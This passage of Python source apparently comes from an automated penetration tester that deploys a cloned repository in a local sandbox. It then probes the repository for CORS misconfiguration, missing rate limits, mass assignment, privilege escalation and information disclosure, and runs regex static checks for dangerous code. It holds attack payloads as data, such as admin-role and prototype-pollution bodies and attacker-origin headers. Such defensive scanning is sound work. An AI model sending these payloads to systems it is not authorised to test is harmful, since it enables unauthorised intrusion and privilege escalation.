                    resp = await self._request(ep.method, ep.path, json_data=role_body)
                    if resp and resp.get("status_code") in (200, 201):
                        body = resp.get("body", "")
                        if any(k in body.lower() for k in ["admin", "role", "permission", "success"]):
                            self.findings.append(PentestFinding(
                                id=self._next_finding_id(),
                                title=f"Privilege Escalation via {ep.path}",
                                category=TestCategory.AUTHZ_BYPASS,
                                severity=Severity.CRITICAL,
                                endpoint=ep.path,
                                method=ep.method,
                                description="Privilege escalation possible by sending role/admin parameters in request body.",
                                evidence=f"Body: {json.dumps(role_body)}\nStatus: {resp['status_code']}\nResponse: {body[:300]}",
                                payload_used=json.dumps(role_body),
                                response_code=resp["status_code"],
                                response_snippet=body[:500],
                                remediation="Never accept role/permission changes from user input. Implement server-side role management with proper authorization.",
                                cwe_id="CWE-269",
                                owasp_category="A01:2021 - Broken Access Control",
                                cvss_score=9.0
                            ))
                            break
    
    # -------------------------------------------------------------------------
    # 10. CORS MISCONFIGURATION TESTING
    # -------------------------------------------------------------------------
    async def test_cors(self, endpoints: List[DiscoveredEndpoint]):
        """Test for CORS misconfiguration."""
        logger.info("Testing CORS configuration...")
        
        test_paths = list(set(["/", "/api"] + [ep.path for ep in endpoints[:3]]))
        
        for path in test_paths:
            for origin in CORS_TEST_ORIGINS:
                self.tests_run += 1
                headers = {"Origin": origin}
                resp = await self._request("OPTIONS", path, headers=headers)
                
                if not resp:
                    resp = await self._request("GET", path, headers=headers)
                
                if resp:
                    acao = resp.get("headers", {}).get("access-control-allow-origin", "")
                    acac = resp.get("headers", {}).get("access-control-allow-credentials", "")
                    
                    if acao == "*" and acac.lower() == "true":
                        self.findings.append(PentestFinding(
                            id=self._next_finding_id(),
                            title=f"Dangerous CORS: Wildcard + Credentials on {path}",
                            category=TestCategory.CORS,
                            severity=Severity.HIGH,
                            endpoint=path,
                            method="OPTIONS",
                            description="CORS allows all origins (*) with credentials. Any website can make authenticated requests to this API.",
                            evidence=f"Origin: {origin}\nAccess-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}",
                            response_code=resp["status_code"],
                            remediation="Restrict Access-Control-Allow-Origin to specific trusted domains. Never combine wildcard (*) with credentials.",
                            cwe_id="CWE-942",
                            owasp_category="A05:2021 - Security Misconfiguration",
                            cvss_score=7.5
                        ))
                        break
                    
                    if acao == origin and origin in ("https://evil.com", "https://attacker.com", "null"):
                        self.findings.append(PentestFinding(
                            id=self._next_finding_id(),
                            title=f"CORS Reflects Arbitrary Origin on {path}",
                            category=TestCategory.CORS,
                            severity=Severity.MEDIUM,
                            endpoint=path,
                            method="OPTIONS",
                            description=f"CORS reflects the attacker-controlled origin '{origin}' in Access-Control-Allow-Origin header.",
                            evidence=f"Origin sent: {origin}\nAccess-Control-Allow-Origin returned: {acao}",
                            response_code=resp["status_code"],
                            remediation="Validate origins against a whitelist. Do not reflect arbitrary Origin headers.",
                            cwe_id="CWE-942",
                            owasp_category="A05:2021 - Security Misconfiguration",
                            cvss_score=6.5
                        ))
                        break
    
    # -------------------------------------------------------------------------
    # 11. RATE LIMITING TEST
    # -------------------------------------------------------------------------
    async def test_rate_limiting(self, endpoints: List[DiscoveredEndpoint]):
        """Test if rate limiting is implemented."""
        logger.info("Testing rate limiting...")
        
        # Find login / auth / sensitive endpoints
        sensitive_endpoints = [ep for ep in endpoints if any(
            kw in ep.path.lower() for kw in ["login", "auth", "register", "signup", "password", "token", "api/users"]
        )]
        
        if not sensitive_endpoints:
            sensitive_endpoints = endpoints[:3]
        
        for ep in sensitive_endpoints[:2]:
            self.tests_run += 1
            
            # Send 25 rapid requests
            responses = []
            for i in range(25):
                resp = await self._request(ep.method, ep.path)
                if resp:
                    responses.append(resp.get("status_code", 0))
                await asyncio.sleep(0.05)  # 50ms between requests
            
            # Check if any rate limiting kicked in (429 status or blocked requests)
            rate_limited = any(code == 429 for code in responses)
            
            if not rate_limited and len(responses) >= 20:
                success_count = sum(1 for code in responses if code in (200, 201, 400, 401, 403, 404, 422))
                if success_count == len(responses):
                    self.findings.append(PentestFinding(
                        id=self._next_finding_id(),
                        title=f"No Rate Limiting on {ep.path}",
                        category=TestCategory.RATE_LIMIT,
                        severity=Severity.MEDIUM,
                        endpoint=ep.path,
                        method=ep.method,
                        description=f"No rate limiting detected after {len(responses)} rapid requests. This allows brute-force attacks, credential stuffing, and DoS.",
                        evidence=f"Sent {len(responses)} requests in rapid succession.\nAll returned without rate limiting (no 429 status).\nStatus codes: {responses[:10]}...",
                        response_code=responses[0] if responses else 0,
                        remediation="Implement rate limiting (e.g., 10 requests/minute for login endpoints). Use tools like express-rate-limit, slowapi, or API gateway rate limiting.",
                        cwe_id="CWE-307",
                        owasp_category="A07:2021 - Identification and Authentication Failures",
                        cvss_score=5.3
                    ))
    
    # -------------------------------------------------------------------------
    # 12. MASS ASSIGNMENT / PARAMETER POLLUTION
    # -------------------------------------------------------------------------
    async def test_mass_assignment(self, endpoints: List[DiscoveredEndpoint]):
        """Test for mass assignment vulnerabilities."""
        logger.info("Testing for Mass Assignment...")
        
        for ep in endpoints:
            if ep.method not in ("POST", "PUT", "PATCH"):
                continue
            
            self.tests_run += 1
            
            # Try to inject extra fields
            injection_bodies = [
                {"role": "admin", "is_admin": True, "permissions": ["admin:*"]},
                {"verified": True, "isVerified": True, "email_verified": True},
                {"balance": 999999, "credits": 999999, "points": 999999},
                {"is_active": True, "status": "active", "approved": True},
                {"__proto__": {"isAdmin": True}},  # Prototype pollution
                {"constructor": {"prototype": {"isAdmin": True}}},  # Prototype pollution
            ]
            
            for extra_fields in injection_bodies:
                resp = await self._request(ep.method, ep.path, json_data=extra_fields)
                if resp and resp.get("status_code") in (200, 201):
                    body = resp.get("body", "")
                    # Check if any injected fields are reflected back
                    for key in extra_fields:
                        if key in body and key not in ("__proto__", "constructor"):
                            self.findings.append(PentestFinding(
                                id=self._next_finding_id(),
                                title=f"Mass Assignment in {ep.path}",
                                category=TestCategory.MISCONFIG,
                                severity=Severity.HIGH if key in ("role", "is_admin", "permissions") else Severity.MEDIUM,
                                endpoint=ep.path,
                                method=ep.method,
                                description=f"Mass assignment vulnerability: the field '{key}' was accepted and potentially stored. Attackers can modify unintended model attributes.",
                                evidence=f"Injected: {json.dumps(extra_fields)}\nField '{key}' appears in response.\nStatus: {resp['status_code']}\nResponse: {body[:300]}",
                                payload_used=json.dumps(extra_fields),
                                response_code=resp["status_code"],
                                response_snippet=body[:500],
                                remediation=f"Use allowlists for accepted fields. Never blindly assign request data to models. Use DTOs/schemas to validate input.",
                                cwe_id="CWE-915",
                                owasp_category="A04:2021 - Insecure Design",
                                cvss_score=7.5
                            ))
                            break
    
    # -------------------------------------------------------------------------
    # 13. INFORMATION DISCLOSURE
    # -------------------------------------------------------------------------
    async def test_information_disclosure(self, endpoints: List[DiscoveredEndpoint]):
        """Test for information disclosure vulnerabilities."""
        logger.info("Testing for Information Disclosure...")
        
        # Test error handling - send invalid data to trigger detailed errors
        for ep in endpoints[:5]:
            self.tests_run += 1
            
            # Send completely wrong content type / malformed data
            resp = await self._request(ep.method, ep.path,
                                       headers={"Content-Type": "application/json"},
                                       data="{{invalid json!@#$%}")
            
            if resp:
                body = resp.get("body", "")
                status = resp.get("status_code", 0)
                
                # Check for stack traces / detailed error info
                error_indicators = [
                    ("traceback", "Python stack trace exposed"),
                    ("file \"", "File path disclosed in error"),
                    ("at module.", "Node.js stack trace exposed"),
                    ("at function.", "Stack trace exposed"),
                    ("exception in thread", "Java stack trace exposed"),
                    ("line \\d+", "Source code line number exposed"),
                    ("sqlalchemy", "ORM details exposed"),
                    ("django.core", "Django internals exposed"),
                    ("internal server error", "Verbose error message"),
                    ("debug", "Debug mode information"),
                    ("password", "Password information in error"),
                    ("secret", "Secret information in error"),
                    ("database", "Database details in error"),
                ]
                
                for indicator, desc in error_indicators:
                    if re.search(indicator, body, re.IGNORECASE):
                        self.findings.append(PentestFinding(
                            id=self._next_finding_id(),
                            title=f"Information Disclosure: {desc} on {ep.path}",
                            category=TestCategory.DATA_EXPOSURE,
                            severity=Severity.MEDIUM,
                            endpoint=ep.path,
                            method=ep.method,
                            description=f"Detailed error information exposed when sending malformed request. {desc}.",
                            evidence=f"Sent malformed data to {ep.path}\nStatus: {status}\nError details: {body[:400]}",
                            response_code=status,
                            response_snippet=body[:500],
                            remediation="Implement generic error responses in production. Never expose stack traces, file paths, or internal details to clients.",
                            cwe_id="CWE-209",
                            owasp_category="A05:2021 - Security Misconfiguration",
                            cvss_score=5.3
                        ))
                        break
    
    # -------------------------------------------------------------------------
    # ORCHESTRATOR: Run All Tests
    # -------------------------------------------------------------------------
    async def run_all_tests(self, endpoints: List[DiscoveredEndpoint]) -> List[PentestFinding]:
        """Run all penetration tests and return findings."""
        logger.info(f"Starting penetration tests against {self.base_url} with {len(endpoints)} endpoints")
        
        # Run tests sequentially to avoid overwhelming the target
        await self.test_security_headers(endpoints)
        await self.test_sql_injection(endpoints)
        await self.test_nosql_injection(endpoints)
        await self.test_xss(endpoints)
        await self.test_command_injection(endpoints)
        await self.test_path_traversal(endpoints)
        await self.test_ssrf(endpoints)
        await self.test_auth_bypass(endpoints)
        await self.test_authorization_bypass(endpoints)
        await self.test_cors(endpoints)
        await self.test_rate_limiting(endpoints)
        await self.test_mass_assignment(endpoints)
        await self.test_information_disclosure(endpoints)
        
        logger.info(f"Penetration testing complete: {self.tests_run} tests, {len(self.findings)} findings")
        return self.findings


# =============================================================================
# MAIN ORCHESTRATOR
# =============================================================================

class RepoPentestScanner:
    """
    Main orchestrator for repository penetration testing.
    
    Flow:
    1. Clone repo
    2. Upload to S3
    3. Detect framework & endpoints
    4. Deploy in sandbox
    5. Run penetration tests
    6. Generate report
    7. Cleanup
    """
    
    def __init__(self):
        self.scan_id = str(uuid.uuid4())[:12]
    
    async def scan(self, repo_url: str, deep_scan: bool = True) -> Dict:
        """
        Execute full penetration test on a GitHub repository.
        
        Args:
            repo_url: GitHub repository URL
            deep_scan: Whether to run extended payloads
            
        Returns:
            Complete penetration test report as dict
        """
        start_time = time.time()
        report = PentestReport(
            repo_url=repo_url,
            scan_id=self.scan_id,
            started_at=datetime.utcnow().isoformat()
        )
        
        temp_dir = None
        sandbox_deployed = False
        
        try:
            # =================================================================
            # STEP 1: Clone & Upload to S3
            # =================================================================
            logger.info(f"[{self.scan_id}] Step 1: Cloning repository...")
            temp_dir, s3_prefix = await RepoS3Storage.clone_and_upload(repo_url, self.scan_id)
            report.s3_key = s3_prefix
            logger.info(f"[{self.scan_id}] Cloned to {temp_dir}, S3: {s3_prefix}")
            
            # =================================================================
            # STEP 2: Detect Framework & Technology
            # =================================================================
            logger.info(f"[{self.scan_id}] Step 2: Detecting framework...")
            framework_info = FrameworkDetector.detect(temp_dir)
            report.framework_detected = framework_info["framework"]
            report.language_detected = framework_info["language"]
            report.technologies = [
                framework_info["framework"],
                framework_info["language"],
            ]
            if framework_info["has_requirements"]:
                report.technologies.append("pip/requirements.txt")
            if framework_info["has_package_json"]:
                report.technologies.append("npm/package.json")
            if framework_info["has_dockerfile"]:
                report.technologies.append("Docker")
            
            logger.info(f"[{self.scan_id}] Framework: {framework_info['framework']} ({framework_info['language']})")
            
            # =================================================================
            # STEP 3: Discover Endpoints
            # =================================================================
            logger.info(f"[{self.scan_id}] Step 3: Discovering endpoints...")
            endpoints = EndpointDiscovery.discover(temp_dir, framework_info["framework"])
            report.endpoints_discovered = [
                {
                    "method": ep.method,
                    "path": ep.path,
                    "file": ep.file,
                    "line": ep.line,
                    "auth_required": ep.auth_required,
                    "parameters": ep.parameters,
                    "framework": ep.framework
                }
                for ep in endpoints
            ]
            
            # Detect auth mechanisms
            auth_types = set()
            for ep in endpoints:
                if ep.auth_required:
                    auth_types.add("JWT" if "jwt" in str(ep.auth_type).lower() else ep.auth_type or "Token-based")
            report.auth_mechanisms = list(auth_types) if auth_types else ["None detected"]
            
            logger.info(f"[{self.scan_id}] Discovered {len(endpoints)} endpoints, auth: {report.auth_mechanisms}")
            
            # =================================================================
            # STEP 4: Deploy in Sandbox
            # =================================================================
            logger.info(f"[{self.scan_id}] Step 4: Deploying sandbox...")
            base_url, port = await SandboxDeployer.deploy(temp_dir, framework_info, self.scan_id)
            
            if base_url:
                sandbox_deployed = True
                report.sandbox_url = base_url
                report.sandbox_port = port
                
                # Change API URLs in the config to localhost for scanning
                base_url = f"http://localhost:{port}"
                logger.info(f"[{self.scan_id}] Sandbox running at {base_url}")
                
                # Wait for health check
                healthy = await self._wait_for_health(base_url)
                if not healthy:
                    logger.warning(f"[{self.scan_id}] Sandbox not healthy, proceeding anyway...")
                    report.errors.append("Sandbox health check failed - some tests may not work correctly")
            else:
                logger.warning(f"[{self.scan_id}] Sandbox deployment failed - running static analysis only")
                report.errors.append("Sandbox deployment failed. Running static-only analysis (no live endpoint testing). Ensure Docker is running.")
                
                # Still perform static code analysis of discovered endpoints
                report.completed_at = datetime.utcnow().isoformat()
                report.duration_seconds = time.time() - start_time
                
                # Add static findings from code analysis
                static_findings = self._static_code_findings(temp_dir, endpoints)
                report.findings = [f.__dict__ if hasattr(f, '__dict__') else f for f in static_findings]
                self._calculate_scores(report)
                return report.to_dict()
            
            # =================================================================  
            # STEP 5: Run Penetration Tests
            # =================================================================
            logger.info(f"[{self.scan_id}] Step 5: Running penetration tests...")
            tester = PenetrationTester(base_url=base_url, timeout=10.0)
            findings = await tester.run_all_tests(endpoints)
            
            report.total_tests_run = tester.tests_run
            report.findings = [
                {
                    "id": f.id,
                    "title": f.title,
                    "category": f.category if isinstance(f.category, str) else f.category.value,
                    "severity": f.severity if isinstance(f.severity, str) else f.severity.value,
                    "endpoint": f.endpoint,
                    "method": f.method,
                    "description": f.description,
                    "evidence": f.evidence,
                    "payload_used": f.payload_used,
                    "response_code": f.response_code,
                    "response_snippet": f.response_snippet,
                    "remediation": f.remediation,
                    "cwe_id": f.cwe_id,
                    "owasp_category": f.owasp_category,
                    "cvss_score": f.cvss_score,
                    "false_positive_likelihood": f.false_positive_likelihood
                }
                for f in findings
            ]
            
            # =================================================================
            # STEP 6: Calculate Scores & Finalize Report
            # =================================================================
            self._calculate_scores(report)
            
            report.completed_at = datetime.utcnow().isoformat()
            report.duration_seconds = time.time() - start_time
            
            logger.info(f"[{self.scan_id}] Scan complete in {report.duration_seconds:.1f}s: "
                        f"{len(report.findings)} findings, risk score: {report.overall_risk_score}")
            
            return report.to_dict()
            
        except Exception as e:
            report.errors.append(f"Scan failed: {str(e)}")
            report.errors.append(traceback.format_exc())
            report.completed_at = datetime.utcnow().isoformat()
            report.duration_seconds = time.time() - start_time
            self._calculate_scores(report)
            logger.error(f"[{self.scan_id}] Scan error: {e}")
            return report.to_dict()
        
        finally:
            # Cleanup
            if sandbox_deployed:
                try:
                    await SandboxDeployer.cleanup(self.scan_id)
                except Exception as e:
                    logger.warning(f"Sandbox cleanup failed: {e}")
            
            if temp_dir and os.path.exists(temp_dir):
                try:
                    import stat
                    def force_rm(func, path, exc_info):
                        try:
                            os.chmod(path, stat.S_IWRITE | stat.S_IREAD)
                            func(path)
                        except Exception:
                            pass
                    shutil.rmtree(temp_dir, onerror=force_rm)
                except Exception:
                    pass
    
    async def _wait_for_health(self, base_url: str, retries: int = 15) -> bool:
        """Poll health endpoint until ready."""
        for i in range(retries):
            try:
                if HTTPX_AVAILABLE:
                    async with httpx.AsyncClient(verify=False, timeout=5) as client:
                        resp = await client.get(f"{base_url}/health")
                        if resp.status_code == 200:
                            return True
                elif REQUESTS_AVAILABLE:
                    resp = sync_requests.get(f"{base_url}/health", timeout=5, verify=False)
                    if resp.status_code == 200:
                        return True
            except Exception:
                pass
            
            wait_time = min(0.5 * (1.5 ** i), 5)
            await asyncio.sleep(wait_time)
        
        return False
    
    def _static_code_findings(self, repo_dir: str, endpoints: List[DiscoveredEndpoint]) -> List[PentestFinding]:
        """Generate findings from static code analysis when sandbox is unavailable."""
        findings = []
        finding_id = 0
        
        skip_dirs = {'node_modules', '.git', 'venv', '__pycache__', '.venv', 'env', 'dist', 'build'}
        
        # Static patterns to look for
        dangerous_patterns = [
            (r'eval\s*\(', "Code Injection via eval()", "CWE-94", Severity.HIGH),
            (r'exec\s*\(', "Code Execution via exec()", "CWE-94", Severity.HIGH),
            (r'os\.system\s*\(', "OS Command Execution", "CWE-78", Severity.CRITICAL),
            (r'subprocess\..*shell\s*=\s*True', "Shell=True in subprocess", "CWE-78", Severity.HIGH),
            (r'innerHTML\s*=', "Potential DOM XSS via innerHTML", "CWE-79", Severity.MEDIUM),
            (r'dangerouslySetInnerHTML', "React dangerouslySetInnerHTML", "CWE-79", Severity.MEDIUM),
            (r'document\.write\s*\(', "document.write can cause XSS", "CWE-79", Severity.MEDIUM),
            (r'\.query\s*\(\s*["\'].*\+', "SQL query with string concatenation", "CWE-89", Severity.HIGH),
            (r'f["\']SELECT.*\{', "SQL injection via f-string", "CWE-89", Severity.CRITICAL),
            (r'SECRET_KEY\s*=\s*["\'][^"\']+["\']', "Hardcoded secret key", "CWE-798", Severity.HIGH),
            (r'password\s*=\s*["\'][^"\']+["\']', "Hardcoded password", "CWE-798", Severity.HIGH),
            (r'CORS\s*\(\s*.*allow_origins\s*=\s*\[\s*["\']\*["\']', "CORS allows all origins", "CWE-942", Severity.MEDIUM),
            (r'verify\s*=\s*False', "SSL verification disabled", "CWE-295", Severity.MEDIUM),
            (r'debug\s*=\s*True', "Debug mode enabled", "CWE-489", Severity.MEDIUM),
            (r'pickle\.loads?\s*\(', "Insecure deserialization (pickle)", "CWE-502", Severity.HIGH),
            (r'yaml\.load\s*\([^)]*\)', "Insecure YAML loading", "CWE-502", Severity.HIGH),
            (r'jwt\.decode\s*\(.*verify\s*=\s*False', "JWT verification disabled", "CWE-347", Severity.CRITICAL),
            (r'chmod\s*\(\s*0o?777', "World-writable permissions", "CWE-732", Severity.MEDIUM),
            (r'binding\s*[=:]\s*["\']0\.0\.0\.0["\']', "Binding to all interfaces", "CWE-668", Severity.LOW),
        ]
        
        for root, dirs, files in os.walk(repo_dir):
            dirs[:] = [d for d in dirs if d not in skip_dirs]
            for fname in files:
                if not fname.endswith(('.py', '.js', '.ts', '.jsx', '.tsx', '.java', '.rb', '.go')):
                    continue
                fpath = os.path.join(root, fname)
                rel_path = os.path.relpath(fpath, repo_dir)
                try:
                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        lines = content.split('\n')
                except Exception:
                    continue
                
                for pattern, title, cwe, severity in dangerous_patterns:
                    for match in re.finditer(pattern, content, re.IGNORECASE):
                        finding_id += 1
                        line_num = content[:match.start()].count('\n') + 1
                        context_start = max(0, line_num - 2)
                        context_end = min(len(lines), line_num + 2)
                        context = '\n'.join(lines[context_start:context_end])
                        
                        findings.append(PentestFinding(
                            id=f"STATIC-{finding_id:04d}",
                            title=f"{title} in {rel_path}",
                            category=TestCategory.INJECTION if "injection" in title.lower() or "xss" in title.lower() else TestCategory.MISCONFIG,
                            severity=severity,
                            endpoint=f"File: {rel_path}:{line_num}",
                            method="STATIC",
                            description=f"Static analysis found potentially dangerous pattern in {rel_path} at line {line_num}.",
                            evidence=f"File: {rel_path}\nLine {line_num}:\n{context}",
                            response_code=0,
                            remediation=f"Review and fix the code pattern. Refer to {cwe} for guidance.",
                            cwe_id=cwe,
                            owasp_category="A03:2021 - Injection" if "89" in cwe or "78" in cwe or "79" in cwe else "A05:2021 - Security Misconfiguration",
                        ))
        
        return findings[:100]  # Cap at 100 static findings
    
    def _calculate_scores(self, report: PentestReport):
        """Calculate risk scores from findings."""
        report.critical_count = sum(1 for f in report.findings if f.get("severity") == "Critical")
        report.high_count = sum(1 for f in report.findings if f.get("severity") == "High")
        report.medium_count = sum(1 for f in report.findings if f.get("severity") == "Medium")
        report.low_count = sum(1 for f in report.findings if f.get("severity") == "Low")
        report.info_count = sum(1 for f in report.findings if f.get("severity") == "Informational")
        
        # Risk score: 0 = safe, 100 = critical
        score = 0
        score += report.critical_count * 25
        score += report.high_count * 15
        score += report.medium_count * 8
        score += report.low_count * 3
        score += report.info_count * 1
        
        report.overall_risk_score = min(100, score)
